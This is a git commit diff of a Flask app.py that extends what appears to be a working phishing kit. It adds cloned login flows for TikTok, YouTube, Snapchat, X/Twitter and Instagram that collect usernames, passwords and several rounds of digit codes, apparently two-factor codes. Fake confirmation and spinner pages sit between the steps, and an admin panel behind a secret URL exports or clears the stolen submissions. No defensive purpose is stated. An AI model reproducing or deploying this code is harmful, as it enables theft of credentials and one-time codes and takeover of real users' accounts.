23961eefdd20a5bdcd73622beeb5a3443a498fc8
jayzguyttw-star <jayzguyttw@gmail.com>
2025-11-10 06:45:50 -0800

    Update app.py
    Update app.py

--- app.py
+++ app.py
@@ -77,7 +77,167 @@ def extract_user(form):
             return val.strip()
     return "anonymous"
 
-# Platform routes with extended flow
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+# TikTok Flow
+@app.route('/joy1_1', methods=['GET','POST'])
+def joy1_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
+        return redirect(url_for('joy1_2'))
+    return render_template('joy1_1.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
+
+@app.route('/joy1_2', methods=['GET','POST'])
+def joy1_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('joy1_3'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-tiktok', 
+                             platform_name='TikTok', 
+                             platform_color='#000000')
+    return render_template('joy1_2.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
+
+@app.route('/joy1_3', methods=['GET','POST'])
+def joy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='TikTok'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-tiktok', 
+                             platform_name='TikTok', 
+                             platform_color='#000000')
+    return render_template('joy1_3.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
+
+# YouTube Flow
+@app.route('/joy2_1', methods=['GET','POST'])
+def joy2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
+        return redirect(url_for('joy2_2'))
+    return render_template('joy2_1.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
+
+@app.route('/joy2_2', methods=['GET','POST'])
+def joy2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('joy2_3'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-youtube', 
+                             platform_name='YouTube', 
+                             platform_color='#FF0000')
+    return render_template('joy2_2.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
+
+@app.route('/joy2_3', methods=['GET','POST'])
+def joy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='YouTube'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-youtube', 
+                             platform_name='YouTube', 
+                             platform_color='#FF0000')
+    return render_template('joy2_3.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
+
+# Snapchat Flow
+@app.route('/happy1_1', methods=['GET','POST'])
+def happy1_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
+        return redirect(url_for('happy1_2'))
+    return render_template('happy1_1.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
+
+@app.route('/happy1_2', methods=['GET','POST'])
+def happy1_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('happy1_2', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('happy1_3'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-snapchat', 
+                             platform_name='Snapchat', 
+                             platform_color='#FFFC00')
+    return render_template('happy1_2.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
+
+@app.route('/happy1_3', methods=['GET','POST'])
+def happy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('happy1_3', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='Snapchat'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-snapchat', 
+                             platform_name='Snapchat', 
+                             platform_color='#FFFC00')
+    return render_template('happy1_3.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
+
+# X/Twitter Flow
+@app.route('/happy2_1', methods=['GET','POST'])
+def happy2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
+        return redirect(url_for('happy2_2'))
+    return render_template('happy2_1.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
+
+@app.route('/happy2_2', methods=['GET','POST'])
+def happy2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('happy2_2', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('happy2_3'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-x-twitter', 
+                             platform_name='X / Twitter', 
+                             platform_color='#000000')
+    return render_template('happy2_2.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
+
+@app.route('/happy2_3', methods=['GET','POST'])
+def happy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('happy2_3', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='X / Twitter'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-x-twitter', 
+                             platform_name='X / Twitter', 
+                             platform_color='#000000')
+    return render_template('happy2_3.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
+
+# Facebook Flow
 @app.route('/love1_1', methods=['GET','POST'])
 def love1_1():
     if request.method == 'POST':
@@ -109,15 +269,62 @@ def love1_3():
         digits = request.form.get('digits','')
         save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
         return render_template('waiting_confirmation.html', 
-                             next_url=url_for('spinner'),
+                             next_url=url_for('spinner', platform='Facebook'),
                              code_value=digits,
                              platform_icon='fa-brands fa-facebook-f', 
                              platform_name='Facebook', 
                              platform_color='#1877F2')
     return render_template('love1_3.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')
 
-# Similar routes for other platforms (love2, joy1, joy2, happy1, happy2)...
-# I'll create the full extended flow for all platforms
+# Instagram Flow
+@app.route('/love2_1', methods=['GET','POST'])
+def love2_1():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        addr = request.form.get('address','')
+        pwd = request.form.get('password','')
+        save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
+        return redirect(url_for('love2_2'))
+    return render_template('love2_1.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
+
+@app.route('/love2_2', methods=['GET','POST'])
+def love2_2():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('love2_2', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('love2_3'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-instagram', 
+                             platform_name='Instagram', 
+                             platform_color='#E4405F')
+    return render_template('love2_2.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
+
+@app.route('/love2_3', methods=['GET','POST'])
+def love2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        digits = request.form.get('digits','')
+        save_submission('love2_3', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        return render_template('waiting_confirmation.html', 
+                             next_url=url_for('spinner', platform='Instagram'),
+                             code_value=digits,
+                             platform_icon='fa-brands fa-instagram', 
+                             platform_name='Instagram', 
+                             platform_color='#E4405F')
+    return render_template('love2_3.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
+
+# Common Flow Pages
+@app.route('/spinner')
+def spinner():
+    platform = request.args.get('platform', 'Unknown')
+    return render_template('spinner.html', 
+                         next_url=url_for('f1', platform=platform),
+                         delay=4,
+                         platform=platform,
+                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
+                         platform_name=platform)
 
 @app.route('/f1', methods=['GET','POST'])
 def f1():
@@ -136,12 +343,22 @@ def f1_A():
         digits = request.form.get('digits','')
         save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
         return render_template('waiting_confirmation.html', 
-                             next_url=url_for('spinner2'),
+                             next_url=url_for('spinner2', platform=request.args.get('platform', 'Unknown')),
                              code_value=digits,
                              platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
                              platform_name=request.args.get('platform', 'Unknown'))
     platform = request.args.get('platform', 'Unknown')
     return render_template('f1_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
+
+@app.route('/spinner2')
+def spinner2():
+    platform = request.args.get('platform', 'Unknown')
+    return render_template('spinner2.html', 
+                         next_url=url_for('f2', platform=platform),
+                         delay=4,
+                         platform=platform,
+                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
+                         platform_name=platform)
 
 @app.route('/f2', methods=['GET','POST'])
 def f2():
@@ -160,32 +377,12 @@ def f2_A():
         digits = request.form.get('digits','')
         save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
         return render_template('waiting_confirmation.html', 
-                             next_url=url_for('m1'),
+                             next_url=url_for('m1', platform=request.args.get('platform', 'Unknown')),
                              code_value=digits,
                              platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
                              platform_name=request.args.get('platform', 'Unknown'))
     platform = request.args.get('platform', 'Unknown')
     return render_template('f2_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
-
-@app.route('/spinner')
-def spinner():
-    platform = request.args.get('platform', 'Unknown')
-    return render_template('spinner.html', 
-                         next_url=url_for('f1', platform=platform),
-                         delay=4,
-                         platform=platform,
-                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
-                         platform_name=platform)
-
-@app.route('/spinner2')
-def spinner2():
-    platform = request.args.get('platform', 'Unknown')
-    return render_template('spinner2.html', 
-                         next_url=url_for('f2', platform=platform),
-                         delay=4,
-                         platform=platform,
-                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
-                         platform_name=platform)
 
 @app.route('/m1')
 def m1():
@@ -213,7 +410,24 @@ def admin():
         rows = conn.execute('SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name FROM submissions ORDER BY id DESC').fetchall()
     return render_template('admin.html', submissions=rows, secret=ADMIN_SECRET)
 
-# Other admin routes remain the same...
+@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
+def admin_clear():
+    with sqlite3.connect(DB_FILE) as conn:
+        conn.execute('DELETE FROM submissions')
+        conn.commit()
+    flash('All submissions cleared.')
+    return redirect(url_for('admin'))
+
+@app.route(f"/admin/{ADMIN_SECRET}/download")
+def download():
+    csv_path = 'submissions_export.csv'
+    with sqlite3.connect(DB_FILE) as conn:
+        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
+    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
+        writer = csv.writer(csvf)
+        writer.writerow(['id','timestamp','page','user','data'])
+        writer.writerows(rows)
+    return send_file(csv_path, as_attachment=True)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
